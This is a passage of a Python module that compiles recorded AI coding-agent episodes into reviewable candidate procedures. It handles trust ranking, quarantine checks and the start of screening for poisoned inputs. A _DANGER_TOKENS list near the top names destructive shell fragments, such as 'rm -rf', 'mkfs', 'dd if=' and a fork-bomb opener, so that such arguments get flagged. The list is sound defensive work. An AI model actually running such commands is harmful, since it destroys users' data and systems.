"""``coding_rules_v1`` — the bounded reference procedure compiler (SPEC_V3
§21–§22).

Input: a *completed* coding episode plus its transitions — action steps and
checker receipts already recorded by the evidence plane (§20). Output: a
``candidate`` :class:`ProcedureRecord` — ordered abstract operations with
instance values lifted into bindings, an environment fingerprint, success
and failure evidence, and derivation edges back to the exact envelopes
(V3-22.01, V3-22.13).

What this producer deliberately never does:

* store executable command text — templates hold ``op_class`` + binding
  slots only; patch bodies and argv tails stay evidence (V3-22.14);
* infer preconditions — differences found by contrastive refinement are
  ``hypothesis`` conditions, never proven requirements (V3-22.03);
* claim authority — a candidate is advice; ``active`` requires explicit
  review in v3.0 (V3-22.04);
* compile what it cannot classify — opaque operations keep the episode
  evidence-only with ``COMPILATION_UNSUPPORTED`` (§22 producer table).

Compilation is idempotent (V3-22.13): the signature dedup key
``(scope_id, signature_digest)`` makes a recompiled episode land on the
same procedure — a *different* episode with the same signature bumps the
procedure's revision instead of creating a parallel record.
"""

from __future__ import annotations

import hashlib
import hmac
import sqlite3
from dataclasses import dataclass, field
from typing import Any, Callable, Optional

from ..core.time import now_us
from ..core.types import (
    ErrorCode,
    VerbatimError,
    json_dumps,
    new_id,
    require_id,
    safe_json_loads,
)
from ..core.types_v3 import (
    Binding,
    CompilationStatus,
    EnvironmentFingerprint,
    FailureMode,
    OperationClass,
    OperationTemplate,
    ProcedureStateV3,
    TrustClass,
    TypedCondition,
)
from ..storage import repos_v3
from ..storage.repos import (
    _json_parse,
    _next_event_seq,
    _row,
    _rows,
    has_table,
)
from .bindings import extract_bindings, revision_binding, tool_name_of
from .operations import checker_from_argv, classify
from .signatures import (
    COMPILER_MANIFEST,
    MAX_BINDINGS,
    MAX_CONTRAST_EPISODES,
    MAX_OPERATIONS,
    PRODUCER_ID,
    PRODUCER_KIND,
    compute_signature,
    find_by_signature,
    intent_key,
    upsert_signature,
)

#: Envelope kinds that count as a checker receipt (V3-22.16).
CHECKER_ENVELOPE_KINDS = frozenset({"test_result", "verification"})

#: Envelope kinds consulted for failure-mode extraction (§21.05).
_FAILURE_ENVELOPE_KINDS = frozenset({"error"})
_RECOVERY_ENVELOPE_KINDS = frozenset({"recovery"})

#: environment_state keys mapped onto EnvironmentFingerprint fields.
_ENV_RUNTIME_PREFIXES = ("runtime.", "runtime:")
_ENV_TOOL_PREFIXES = ("tool.", "tool_schema.", "tool:", "tool_schema:")

#: Substrings that mark potentially destructive arguments → high risk.
_DANGER_TOKENS = (
    "rm -rf", "rm -fr", "sudo ", "--force", "chmod 777", "dd if=",
    "mkfs", "> /dev/", ":(){", "shutdown", "reboot",
)

_SUCCESS_WORDS = {"success", "passed", "pass", "ok", "green", "exit_0", "true"}
_FAILURE_WORDS = {"failure", "failed", "fail", "red", "error", "false"}
_PARTIAL_WORDS = {"partial", "flaky", "some"}


@dataclass(frozen=True)
class CompilationResult:
    """Episode → procedure compilation outcome (V3-22.01, V3-22.13)."""

    procedure_id: Optional[str]
    status: CompilationStatus
    reason: str = ""

    def __post_init__(self) -> None:
        if not isinstance(self.status, CompilationStatus):
            object.__setattr__(self, "status", CompilationStatus(self.status))

    def as_dict(self) -> dict[str, Any]:
        return {
            "procedure_id": self.procedure_id,
            "status": self.status.value,
            "reason": self.reason,
        }


@dataclass
class _StepOp:
    """One action step decoded for compilation."""

    transition_id: str
    ord: int
    step_id: str
    envelope_id: Optional[str]
    tool: str
    args: dict[str, Any]
    op_class: OperationClass
    resolved: bool


@dataclass
class _Extraction:
    """Everything the compiler learned from one episode's transitions."""

    episode: dict[str, Any]
    ops: list[_StepOp] = field(default_factory=list)
    transitions: list[dict[str, Any]] = field(default_factory=list)
    unresolved: int = 0
    checker_refs: list[dict[str, Any]] = field(default_factory=list)
    failures: list[FailureMode] = field(default_factory=list)
    goal_class: str = "unknown"
    check_kind: str = "unknown"
    environment: Optional[EnvironmentFingerprint] = None
    env_digests: list[str] = field(default_factory=list)

    @property
    def recognized(self) -> list[_StepOp]:
        return [o for o in self.ops if o.op_class != OperationClass.OPAQUE]

    @property
    def opaque(self) -> list[_StepOp]:
        return [o for o in self.ops if o.op_class == OperationClass.OPAQUE]

    @property
    def checker_receipts(self) -> list[dict[str, Any]]:
        return [c for c in self.checker_refs if c.get("receipt")]


# ---------------------------------------------------------------------------
# evidence-plane row helpers
# ---------------------------------------------------------------------------


def _episode_row(conn: sqlite3.Connection, episode_id: str) -> dict[str, Any]:
    require_id(episode_id, "episode_id")
    row = _row(
        conn.execute(
            "SELECT * FROM episodes WHERE episode_id = ?", (episode_id,)
        )
    )
    if row is None:
        raise VerbatimError(
            ErrorCode.NOT_FOUND_OR_UNAUTHORIZED, "episode not found"
        )
    return row


def _envelope_held(conn: sqlite3.Connection, env_row: dict[str, Any]) -> bool:
    """A quarantine hold makes an envelope unavailable as producer input.

    V4-36.03/V4-36.06: a hold on the ``source_envelope`` row itself — or
    on its source revision — excludes the envelope from compilation the
    same way retrieval withholds it; the episode then reads as
    *unresolved evidence*, never as absent-but-compiled.
    """
    try:
        from ..security.quarantine import is_quarantined
    except ImportError:  # pragma: no cover - security layer absent
        return False
    if not has_table(conn, "quarantine"):
        return False
    rev = env_row.get("revision")
    if rev is None:
        return False
    rev = int(rev)
    if is_quarantined(
        conn, "source_envelope", env_row["envelope_id"], rev
    ):
        return True
    src = env_row.get("source_id")
    return bool(src) and is_quarantined(conn, "source", src, rev)


def _envelope_row(
    conn: sqlite3.Connection, envelope_id: Optional[str]
) -> Optional[dict[str, Any]]:
    if not envelope_id:
        return None
    row = _row(
        conn.execute(
            "SELECT * FROM source_envelopes WHERE envelope_id = ?",
            (envelope_id,),
        )
    )
    if row is None or _envelope_held(conn, row):
        return None
    return row


def _envelope_payload(
    conn: sqlite3.Connection,
    env_row: dict[str, Any],
    hmac_fn: Callable[[bytes], bytes],
) -> Optional[dict[str, Any]]:
    """Best-effort JSON payload of an envelope via its source revision.

    The payload is a verified read (V4-08.03/V4-13.05): when the revision
    carries a keyed ``payload_hmac`` the stored digest is compared before
    the bytes are decoded — a mismatch is ``STORE_CORRUPT``, never
    compiler input. A NULL digest is the legacy-unverified row (readable,
    never verified) consistent with the storage repos.
    """
    src, rev = env_row.get("source_id"), env_row.get("revision")
    if not src or rev is None:
        return None
    row = conn.execute(
        "SELECT payload, payload_hmac FROM source_revisions"
        " WHERE source_id = ? AND revision = ?",
        (src, rev),
    ).fetchone()
    if row is None:
        return None
    payload, stored = row[0], row[1]
    if stored is not None:
        raw = (
            bytes(payload)
            if isinstance(payload, (bytes, bytearray))
            else payload.encode("utf-8")
            if isinstance(payload, str)
            else None
        )
        if raw is None or hmac_fn is None or not hmac.compare_digest(
            hmac_fn(raw), bytes(stored)
        ):
            raise VerbatimError(
                ErrorCode.STORE_CORRUPT,
                f"payload digest mismatch for {src}@{rev}",
            )
    if isinstance(payload, (bytes, bytearray)):
        try:
            payload = bytes(payload).decode("utf-8")
        except UnicodeDecodeError:
            return None
    if not isinstance(payload, str):
        return None
    try:
        value = safe_json_loads(payload)
    except VerbatimError:
        return None
    return value if isinstance(value, dict) else None


def _decode_tool_call(
    conn: sqlite3.Connection,
    env_row: dict[str, Any],
    hmac_fn: Callable[[bytes], bytes],
) -> tuple[Optional[str], dict[str, Any]]:
    """Tool name + argument mapping from a ``tool_call`` envelope.

    The compiler reads only *declared* call shape: ``tool``/``tool_name``/
    ``name`` plus ``args``/``arguments``/``input``/``parameters``/``params``
    in the envelope metadata, falling back to the envelope's JSON payload.
    """
    meta = _json_parse(env_row.get("metadata_json")) or {}
    payload = _envelope_payload(conn, env_row, hmac_fn) or {}
    tool = (
        meta.get("tool") or meta.get("tool_name") or meta.get("name")
        or payload.get("tool") or payload.get("tool_name")
        or payload.get("name")
    )
    args: Any = None
    for source in (meta, payload):
        if not isinstance(source, dict):
            continue
        for key in ("args", "arguments", "input", "parameters", "params"):
            if args is None and isinstance(source.get(key), dict):
                args = source[key]
        if args is not None:
            break
    return (tool if isinstance(tool, str) else None), (args or {})


def _observations_for_step(
    conn: sqlite3.Connection, step_id: str
) -> list[dict[str, Any]]:
    """Observation envelopes attached to a trajectory step (in ord).

    Held envelopes are excluded — producer inputs honor the quarantine
    cascade the same way deliveries do (V4-36.03).
    """
    rows = _rows(
        conn.execute(
            "SELECT e.* FROM step_observations so"
            " JOIN source_envelopes e ON e.envelope_id = so.envelope_id"
            " WHERE so.step_id = ? ORDER BY so.ord, e.envelope_id",
            (step_id,),
        )
    )
    return [r for r in rows if not _envelope_held(conn, r)]


def _norm_outcome(raw: Any, exit_code: Any = None) -> str:
    if isinstance(raw, str):
        w = raw.strip().lower()
        if w in _SUCCESS_WORDS:
            return "success"
        if w in _FAILURE_WORDS:
            return "failure"
        if w in _PARTIAL_WORDS:
            return "partial"
    if isinstance(exit_code, bool):
        return "success" if exit_code else "failure"
    if isinstance(exit_code, int):
        return "success" if exit_code == 0 else "failure"
    return "unknown"


def _checker_info(
    conn: sqlite3.Connection,
    env_row: dict[str, Any],
    hmac_fn: Callable[[bytes], bytes],
) -> dict[str, Any]:
    """Checker-receipt fields out of a test_result/verification envelope."""
    meta = _json_parse(env_row.get("metadata_json")) or {}
    payload = _envelope_payload(conn, env_row, hmac_fn) or {}
    checker = (
        meta.get("checker") or meta.get("checker_id") or meta.get("name")
        or payload.get("checker") or payload.get("checker_id")
        or payload.get("name")
    )
    exit_code = meta.get("exit_code", payload.get("exit_code"))
    outcome = _norm_outcome(
        meta.get("outcome") or payload.get("outcome") or payload.get("status"),
        exit_code,
    )
    selected = (
        meta.get("selected_tests") or payload.get("selected_tests")
        or payload.get("tests") or []
    )
    if not isinstance(selected, (list, tuple)):
        selected = [selected]
    return {
        "checker": str(checker) if checker else None,
        "outcome": outcome,
        "completed": bool(meta.get("completed", payload.get("completed", True))),
        "exit_code": exit_code if isinstance(exit_code, int) else None,
        "selected_tests": [str(t) for t in selected],
        "envelope_id": env_row["envelope_id"],
    }


# ---------------------------------------------------------------------------
# environment + goal extraction
# ---------------------------------------------------------------------------


def _environment_for(
    conn: sqlite3.Connection, scope_id: str
) -> EnvironmentFingerprint:
    """Observed environment from ``environment_state`` rows (§20.03, §24.04).

    Key convention (deterministic): ``repo_id``, ``repo_revision``,
    ``platform`` map to the named fingerprint fields; ``runtime.<name>`` /
    ``runtime:<name>`` become runtime versions; ``tool.<name>`` /
    ``tool_schema.<name>`` become tool-schema versions. Missing keys stay
    ``None`` — absent information is unknown, never a wildcard (V3-21.07).
    """
    rows = repos_v3.query(conn, "environment_state", {"scope_id": scope_id})
    repo_id = repo_rev = platform = None
    runtimes: dict[str, str] = {}
    tools: dict[str, str] = {}
    for r in sorted(rows, key=lambda r: r["key"]):
        key, value = r["key"], str(r["value"])
        if key == "repo_id":
            repo_id = value
        elif key in ("repo_revision", "revision"):
            repo_rev = value
        elif key in ("platform", "os"):
            platform = value
        elif key.startswith(_ENV_RUNTIME_PREFIXES):
            name = key.replace(":", ".", 1).split(".", 1)[-1]
            runtimes[name] = value
        elif key.startswith(_ENV_TOOL_PREFIXES):
            name = key.replace(":", ".", 1).split(".", 1)[-1]
            tools[name] = value
    return EnvironmentFingerprint(
        repo_id=repo_id,
        repo_revision=repo_rev,
        runtime_versions=tuple(sorted(runtimes.items())),
        tool_schema_versions=tuple(sorted(tools.items())),
        platform=platform,
    )


def environment_map(env: Optional[EnvironmentFingerprint]) -> dict[str, Any]:
    """Flat key → value map for TypedCondition evaluation."""
    if env is None:
        return {}
    out: dict[str, Any] = {}
    if env.repo_id is not None:
        out["repo_id"] = env.repo_id
    if env.repo_revision is not None:
        out["repo_revision"] = env.repo_revision
    if env.platform is not None:
        out["platform"] = env.platform
    for name, ver in env.runtime_versions:
        out[f"runtime.{name}"] = ver
    for name, ver in env.tool_schema_versions:
        out[f"tool.{name}"] = ver
    return out


def _goal_class(
    conn: sqlite3.Connection,
    episode: dict[str, Any],
    ops: list[_StepOp],
) -> str:
    """Host-declared goal class: trajectory metadata → episode label →
    ``unknown``. Never inferred from outcome (§22 signature row)."""
    traj_ids: list[str] = []
    for op in ops:
        step = _row(
            conn.execute(
                "SELECT trajectory_id FROM trajectory_steps WHERE step_id = ?",
                (op.step_id,),
            )
        )
        if step and step["trajectory_id"] and step["trajectory_id"] not in traj_ids:
            traj_ids.append(step["trajectory_id"])
    for tid in traj_ids:
        row = _row(
            conn.execute(
                "SELECT metadata_json FROM trajectories WHERE trajectory_id = ?",
                (tid,),
            )
        )
        if row:
            meta = _json_parse(row.get("metadata_json")) or {}
            goal = meta.get("goal_class") or meta.get("goal")
            if isinstance(goal, str) and goal:
                return goal
    label = episode.get("label")
    return label if isinstance(label, str) and label else "unknown"


def _hazards_and_risk(ops: list[_StepOp]) -> tuple[list[str], str]:
    hazards: list[str] = []
    risk = "low"
    classes = {o.op_class for o in ops}
    if OperationClass.APPLY_PATCH in classes:
        hazards.append("modifies_repo_files")
        risk = "medium"
    if OperationClass.RUN_CHECK in classes:
        hazards.append("executes_checker")
    for op in ops:
        blob = json_dumps(op.args).lower() if op.args else ""
        if any(tok in blob for tok in _DANGER_TOKENS):
            if "potentially_destructive_arguments" not in hazards:
                hazards.append("potentially_destructive_arguments")
            risk = "high"
    return hazards, risk


def _failure_signature(op_class: str, summary: str) -> str:
    return hashlib.sha256(f"{op_class}|{summary}".encode("utf-8")).hexdigest()[:16]


def _error_summary(env_row: dict[str, Any]) -> str:
    meta = _json_parse(env_row.get("metadata_json")) or {}
    for key in ("error_type", "error", "code", "kind", "message"):
        v = meta.get(key)
        if isinstance(v, str) and v:
            return v[:64]
    return "error"


# ---------------------------------------------------------------------------
# episode extraction
# ---------------------------------------------------------------------------


def _extract_episode(
    conn: sqlite3.Connection,
    episode: dict[str, Any],
    hmac_fn: Callable[[bytes], bytes],
) -> _Extraction:
    """Decode transitions → classified ops, checker receipts, failures."""
    ex = _Extraction(episode=episode)
    episode_id = episode["episode_id"]
    ex.transitions = _rows(
        conn.execute(
            "SELECT * FROM transitions WHERE episode_id = ?"
            " ORDER BY ord, transition_id",
            (episode_id,),
        )
    )
    seen_steps: set[str] = set()
    for t in ex.transitions:
        if t.get("environment_digest"):
            if t["environment_digest"] not in ex.env_digests:
                ex.env_digests.append(t["environment_digest"])
        cref = t.get("checker_ref")
        if cref:
            # Checker receipts attach to transitions, not necessarily to an
            # action step — a ``verified_by`` edge may carry no action.
            crow = _envelope_row(conn, cref)
            receipt = (
                crow is not None
                and crow.get("envelope_kind") in CHECKER_ENVELOPE_KINDS
            )
            ex.checker_refs.append(
                {
                    "checker_ref": cref,
                    "transition_id": t["transition_id"],
                    "envelope": crow,
                    "receipt": receipt,
                }
            )
        step_id = t.get("action_step_id")
        if not step_id:
            continue
        if step_id in seen_steps:
            # Duplicate telemetry of the same executed step is normalized,
            # not repeated (§22 signature row).
            continue
        seen_steps.add(step_id)
        step = _row(
            conn.execute(
                "SELECT * FROM trajectory_steps WHERE step_id = ?", (step_id,)
            )
        )
        env_row = (
            _envelope_row(conn, step.get("action_envelope_id"))
            if step is not None
            else None
        )
        if step is None or env_row is None:
            ex.unresolved += 1
            ex.ops.append(
                _StepOp(
                    transition_id=t["transition_id"], ord=int(t["ord"]),
                    step_id=step_id, envelope_id=None, tool="",
                    args={}, op_class=OperationClass.OPAQUE, resolved=False,
                )
            )
            continue
        if env_row.get("envelope_kind") == "tool_call":
            tool, args = _decode_tool_call(conn, env_row, hmac_fn)
            op_class = classify(tool, args)
        else:
            # A non-tool action envelope (message, browser state, …) is
            # evidence the compiler cannot abstract.
            tool, args = None, {}
            op_class = OperationClass.OPAQUE
        ex.ops.append(
            _StepOp(
                transition_id=t["transition_id"], ord=int(t["ord"]),
                step_id=step_id, envelope_id=env_row["envelope_id"],
                tool=tool or "", args=args, op_class=op_class, resolved=True,
            )
        )
        # Failure evidence: error envelopes observed on this action step
        # (§21.05) plus any recovery envelope that followed.
        recovery_ref: Optional[str] = None
        for obs in _observations_for_step(conn, step_id):
            kind = obs.get("envelope_kind")
            if kind in _RECOVERY_ENVELOPE_KINDS:
                recovery_ref = obs["envelope_id"]
        for obs in _observations_for_step(conn, step_id):
            if obs.get("envelope_kind") not in _FAILURE_ENVELOPE_KINDS:
                continue
            summary = _error_summary(obs)
            ex.failures.append(
                FailureMode(
                    signature=_failure_signature(
                        op_class.value, summary
                    ),
                    description=(
                        f"action '{tool or 'unknown'}' ({op_class.value}) at "
                        f"ord {t['ord']} produced error: {summary}"
                    ),
                    evidence_refs=(obs["envelope_id"], t["transition_id"]),
                    recovery=recovery_ref,
                    occurrences=1,
                )
            )
    ex.goal_class = _goal_class(conn, episode, ex.ops)
    # Check kind: the receipt's declared checker identity first, then the
    # run-check op's allowlisted argv head.
    for c in ex.checker_receipts:
        info = _checker_info(conn, c["envelope"], hmac_fn)
        c["info"] = info
        if info["checker"]:
            ex.check_kind = info["checker"]
            break
    if ex.check_kind == "unknown":
        for op in reversed(ex.ops):
            if op.op_class != OperationClass.RUN_CHECK:
                continue
            argv = None
            for key in ("argv", "args_list", "command_argv", "exec_argv"):
                if isinstance(op.args.get(key), (list, tuple)):
                    argv = list(op.args[key])
                    break
            name = checker_from_argv(argv)
            if name:
                ex.check_kind = name
                break
    return ex


# ---------------------------------------------------------------------------
# record building
# ---------------------------------------------------------------------------


def _env_conditions(env: Optional[EnvironmentFingerprint]) -> list[TypedCondition]:
    """The observed-environment envelope as evaluable conditions (V3-22.15)."""
    out: list[TypedCondition] = []
    for key, value in sorted(environment_map(env).items()):
        out.append(
            TypedCondition(
                key=f"environment.{key}", op="eq", value=str(value),
                provenance="observed", validated=True,
            )
        )
    return out


def _artifact_types(ops: list[_StepOp], bindings: list[Binding]) -> list[str]:
    out: set[str] = set()
    for b in bindings:
        if b.kind == "repo_path":
            out.add("repo_files")
        elif b.kind == "test_target":
            out.add("test_targets")
        elif b.kind == "revision":
            out.add("revisions")
    for o in ops:
        if o.op_class == OperationClass.RUN_CHECK:
            out.add("check_results")
    return sorted(out)


def _failure_modes_payload(failures: list[FailureMode]) -> dict[str, Any]:
    if not failures:
        # V3-21.05: no contrary outcome evidence → labeled, never presumed
        # safe.
        return {"modes": [], "status": "no_failure_evidence"}
    merged: dict[str, dict[str, Any]] = {}
    for f in failures:
        cur = merged.get(f.signature)
        if cur is None:
            merged[f.signature] = {
                "signature": f.signature,
                "description": f.description,
                "evidence_refs": list(f.evidence_refs),
                "recovery": f.recovery,
                "occurrences": f.occurrences,
            }
        else:
            cur["occurrences"] += f.occurrences
            cur["evidence_refs"] = sorted(
                set(cur["evidence_refs"]) | set(f.evidence_refs)
            )
            if cur["recovery"] is None:
                cur["recovery"] = f.recovery
    return {
        "modes": [merged[k] for k in sorted(merged)],
        "status": "observed",
    }


def _reuse_stats_zero() -> dict[str, Any]:
    return {
        "exposed": 0, "applicable": 0, "adopted": 0,
        "success": 0, "failure": 0, "unknown": 0, "total": 0,
        "by_environment": {}, "paired": {},
    }


def _build_record_parts(
    conn: sqlite3.Connection, ex: _Extraction
) -> dict[str, Any]:
    """Compile the extraction into the procedures-row column payload."""
    ops = ex.recognized
    templates: list[dict[str, Any]] = []
    bindings: list[Binding] = []
    evidence_envs: list[str] = []
    for i, op in enumerate(ops):
        template, binds = extract_bindings(
            op.op_class, op.args, ord=int(op.ord)
        )
        bindings.extend(binds)
        refs = [op.envelope_id] if op.envelope_id else []
        refs.append(op.transition_id)
        evidence_envs.extend(r for r in refs if r)
        templates.append(
            {
                "op_class": op.op_class.value,
                "tool": tool_name_of(op.tool),
                "param_template": template,
                "ord": int(op.ord),
                "evidence_refs": refs,
            }
        )
    # Checker receipts → verification entries + a checker-failure mode.
    verification: list[dict[str, Any]] = []
    failures = list(ex.failures)
    for c in ex.checker_receipts:
        info = c["info"]
        verification.append(
            {
                "checker_ref": c["checker_ref"],
                "envelope_id": c["envelope"]["envelope_id"],
                "checker": info["checker"],
                "outcome": info["outcome"],
                "completed": info["completed"],
                "exit_code": info["exit_code"],
                "selected_tests": info["selected_tests"],
            }
        )
        evidence_envs.append(c["envelope"]["envelope_id"])
        if info["outcome"] == "failure":
            sig = _failure_signature("run_check", f"checker:{info['checker']}")
            failures.append(
                FailureMode(
                    signature=sig,
                    description=(
                        f"checker '{info['checker'] or 'unknown'}' reported "
                        "failure"
                    ),
                    evidence_refs=(c["envelope"]["envelope_id"], c["checker_ref"]),
                    recovery=None,
                    occurrences=1,
                )
            )
    env = ex.environment
    rev_binding = revision_binding(env.repo_revision if env else None)
    if rev_binding is not None:
        bindings.append(rev_binding)
    hazards, risk = _hazards_and_risk(ops)
    intent = {
        "goal_class": ex.goal_class,
        "task_family": ex.goal_class,
        "check_kind": ex.check_kind,
        "binding_kinds": sorted({b.kind for b in bindings}),
        "artifact_types": _artifact_types(ops, bindings),
        "entity_types": [],
    }
    ordered = [o["op_class"] for o in templates]
    key = intent_key(ex.goal_class, ex.check_kind, [b.kind for b in bindings])
    digest = compute_signature(key, ordered)
    env_map = environment_map(env)
    checker_label = ex.check_kind if ex.check_kind != "unknown" else "checker"
    outcome = ex.episode.get("outcome") or "unknown"
    expected = (
        f"check '{checker_label}' completes; observed outcome '{outcome}'"
    )
    provenance = {
        "compiler": COMPILER_MANIFEST,
        "source_episodes": [ex.episode["episode_id"]],
        "transitions": [t["transition_id"] for t in ex.transitions],
        "evidence_envelopes": sorted(set(evidence_envs)),
        "boundary_rule": ex.episode.get("boundary_rule"),
        "episode_outcome": outcome,
        "environment_digests": ex.env_digests,
        "reviews": [],
        "refinements": [],
        "activations": [],
        "suspensions": [],
    }
    return {
        "templates": templates,
        "bindings": bindings,
        "verification": verification,
        "failures": failures,
        "hazards": hazards,
        "risk": risk,
        "intent": intent,
        "intent_key": key,
        "signature_digest": digest,
        "ordered_ops": ordered,
        "env": env,
        "env_map": env_map,
        "applicability": _env_conditions(env),
        "expected_outcome": expected,
        "provenance": provenance,
    }


def _family_id(scope_id: str, procedure_id: str) -> str:
    return "fam:" + hashlib.sha256(
        f"family|{scope_id}|{procedure_id}".encode("utf-8")
    ).hexdigest()[:24]


def _record_derivation_edges(
    conn: sqlite3.Connection,
    scope_id: str,
    procedure_id: str,
    revision: int,
    ex: _Extraction,
    evidence_envs: list[str],
    seq: int,
) -> int:
    """Append immutable derivation edges (V3-17.02); returns edges written."""
    parents: list[tuple[str, str, int]] = [
        ("episode", ex.episode["episode_id"], int(ex.episode.get("revision") or 1))
    ]
    parents += [("transition", t["transition_id"], 1) for t in ex.transitions]
    parents += [("envelope", e, 1) for e in sorted(set(evidence_envs))]
    n = 0
    for kind, pid, prev in parents:
        edge = {
            "child_kind": "procedure",
            "child_id": procedure_id,
            "child_revision": int(revision),
            "parent_kind": kind,
            "parent_id": pid,
            "parent_revision": int(prev),
            "producer_kind": PRODUCER_KIND,
            "producer_id": PRODUCER_ID,
            "seq": seq,
            "scope_id": scope_id,
        }
        existing = repos_v3.get(
            conn, "derivations",
            {
                "child_kind": "procedure", "child_id": procedure_id,
                "child_revision": int(revision), "parent_kind": kind,
                "parent_id": pid, "parent_revision": int(prev),
            },
        )
        if existing is None:
            repos_v3.insert(conn, "derivations", edge)
            n += 1
    return n


def _ensure_family(
    conn: sqlite3.Connection,
    scope_id: str,
    procedure_id: str,
    episode_id: str,
    seq: int,
) -> str:
    """Evidence-family bookkeeping (V3-21.08): one family groups the
    procedure with its source episodes so copies count once."""
    fam = _family_id(scope_id, procedure_id)
    conn.execute(
        "INSERT OR IGNORE INTO evidence_families"
        " (family_id, scope_id, origin_kind, origin_id, created_event)"
        " VALUES (?, ?, 'episode', ?, ?)",
        (fam, scope_id, episode_id, seq),
    )
    for kind, oid, role in (
        ("procedure", procedure_id, "derived"),
        ("episode", episode_id, "origin"),
    ):
        conn.execute(
            "INSERT OR IGNORE INTO family_members"
            " (family_id, object_kind, object_id, role)"
            " VALUES (?, ?, ?, ?)",
            (fam, kind, oid, role),
        )
    return fam


def _episode_already_derived(
    conn: sqlite3.Connection, procedure_id: str, episode_id: str
) -> bool:
    row = conn.execute(
        "SELECT 1 FROM derivations WHERE child_kind = 'procedure'"
        " AND child_id = ? AND parent_kind = 'episode' AND parent_id = ?"
        " LIMIT 1",
        (procedure_id, episode_id),
    ).fetchone()
    return row is not None


def _merge_conditions(
    existing: list[dict[str, Any]], new: list[TypedCondition]
) -> list[dict[str, Any]]:
    """Union conditions by (key, op, value); reviewer/hypothesis provenance
    on the stored row is preserved (V3-22.03)."""
    seen: set[tuple] = set()
    out: list[dict[str, Any]] = []
    for c in existing:
        k = (c.get("key"), c.get("op"), json_dumps(c.get("value")))
        if k in seen:
            continue
        seen.add(k)
        out.append(dict(c))
    for c in new:
        k = (c.key, c.op, json_dumps(c.value))
        if k in seen:
            continue
        seen.add(k)
        out.append(
            {
                "key": c.key, "op": c.op, "value": c.value,
                "provenance": c.provenance, "validated": c.validated,
            }
        )
    return out


def _merge_failure_payloads(old: Any, new: dict[str, Any]) -> dict[str, Any]:
    old_modes = (old or {}).get("modes") or []
    merged: dict[str, dict[str, Any]] = {
        m["signature"]: dict(m) for m in old_modes if m.get("signature")
    }
    for m in new.get("modes") or []:
        sig = m["signature"]
        cur = merged.get(sig)
        if cur is None:
            merged[sig] = dict(m)
        else:
            cur["occurrences"] = int(cur.get("occurrences") or 0) + int(
                m.get("occurrences") or 0
            )
            cur["evidence_refs"] = sorted(
                set(cur.get("evidence_refs") or [])
                | set(m.get("evidence_refs") or [])
            )
            if cur.get("recovery") is None:
                cur["recovery"] = m.get("recovery")
    modes = [merged[k] for k in sorted(merged)]
    return {"modes": modes, "status": "observed" if modes else "no_failure_evidence"}


def _merge_provenance(old: Any, new: dict[str, Any]) -> dict[str, Any]:
    base = dict(old or {})
    for key in ("source_episodes", "transitions", "evidence_envelopes",
                "environment_digests"):
        merged = list(base.get(key) or [])
        for v in new.get(key) or []:
            if v not in merged:
                merged.append(v)
        base[key] = merged
    for key in ("reviews", "refinements", "activations", "suspensions"):
        base.setdefault(key, [])
    base["compiler"] = new.get("compiler", COMPILER_MANIFEST)
    base["boundary_rule"] = new.get("boundary_rule", base.get("boundary_rule"))
    base["episode_outcome"] = new.get(
        "episode_outcome", base.get("episode_outcome")
    )
    return base


# ---------------------------------------------------------------------------
# compile + refine
# ---------------------------------------------------------------------------


class ProcedureCompiler:
    """The ``coding_rules_v1`` bounded producer (§22).

    Stateless apart from the pinned manifest — every rule lives in this
    module's tables so compilation is deterministic and replayable
    (V3-22.13).
    """

    manifest = COMPILER_MANIFEST

    def compile_episode(
        self,
        conn: sqlite3.Connection,
        episode_id: str,
        *,
        hmac_fn: Callable[[bytes], bytes],
    ) -> CompilationResult:
        return compile_episode(conn, episode_id, hmac_fn=hmac_fn)

    def refine(
        self,
        conn: sqlite3.Connection,
        procedure_id: str,
        contrasting_episode_id: str,
        *,
        hmac_fn: Callable[[bytes], bytes],
    ) -> dict[str, Any]:
        return refine_procedure(
            conn, procedure_id, contrasting_episode_id, hmac_fn=hmac_fn
        )


def _gate(ex: _Extraction) -> Optional[CompilationResult]:
    """Compilation gates in spec order; None means 'proceed to record'."""
    episode = ex.episode
    if episode.get("recorded_until") is None:
        return CompilationResult(
            None, CompilationStatus.INCOMPLETE, "episode_not_completed"
        )
    if not ex.ops:
        return CompilationResult(
            None, CompilationStatus.INCOMPLETE, "no_action_steps"
        )
    if ex.unresolved:
        return CompilationResult(
            None, CompilationStatus.INCOMPLETE, "unresolved_action_evidence"
        )
    if len(ex.ops) > MAX_OPERATIONS:
        return CompilationResult(
            None, CompilationStatus.UNSUPPORTED, "operation_limit_exceeded"
        )
    if ex.opaque:
        # Opaque operations block automatic compilation of the episode —
        # they stay evidence, never an abstracted template (§22 op-mapping
        # row).
        return CompilationResult(
            None, CompilationStatus.UNSUPPORTED, "opaque_operations_present"
        )
    if len(ex.recognized) < 2:
        return CompilationResult(
            None, CompilationStatus.UNSUPPORTED,
            "fewer_than_two_recognized_operations",
        )
    if not ex.checker_receipts:
        # No authorized checker receipt → no procedure (§22 boundary row:
        # "missing … checker yields an incomplete episode; no active
        # procedure"). The producer reports UNSUPPORTED, not silent success.
        return CompilationResult(
            None, CompilationStatus.UNSUPPORTED, "no_checker_receipt"
        )
    return None


# ---------------------------------------------------------------------------
# screening (V3-14.06: experience→procedure is a separately screened channel)
# ---------------------------------------------------------------------------

#: Weakest-first ordering used to union parent origins; a derived object
#: inherits the *most restrictive* trust present among its parents, never an
#: upgrade (V3-14.06).
_TRUST_ORDER = (
    TrustClass.PRINCIPAL_DIRECT,
    TrustClass.PRINCIPAL_REPORTED,
    TrustClass.HOST_OBSERVED,
    TrustClass.AGENT_GENERATED,
    TrustClass.IMPORTED,
    TrustClass.EXTERNAL_CONTENT,
    TrustClass.UNKNOWN,
)


def _parent_trust(conn: sqlite3.Connection, envelope_ids: list) -> TrustClass:
    """Most restrictive origin among parent envelopes; an unresolvable or
    unrecognized parent contributes UNKNOWN — never silently trusted."""
    worst = TrustClass.PRINCIPAL_DIRECT
    for eid in envelope_ids:
        row = conn.execute(
            "SELECT trust_class FROM source_envelopes WHERE envelope_id = ?",
            (eid,),
        ).fetchone()
        tc = TrustClass.UNKNOWN
        if row is not None:
            try:
                tc = TrustClass(row[0])
            except ValueError:
                tc = TrustClass.UNKNOWN
        if _TRUST_ORDER.index(tc) > _TRUST_ORDER.index(worst):
            worst = tc
    return worst


def _screen_compiled(
    conn: sqlite3.Connection,
    scope_id: str,
    procedure_id: str,
    revision: int,
    ex: _Extraction,
    parts: dict[str, Any],
) -> Optional[str]:
    """Screen the compiled procedure before it becomes durable (V3-14.06).

    The screened surface is everything an upstream poisoned envelope could
    shape: the goal label, tool names, expected outcome, and — critically —
    observed binding values, which carry raw arguments like
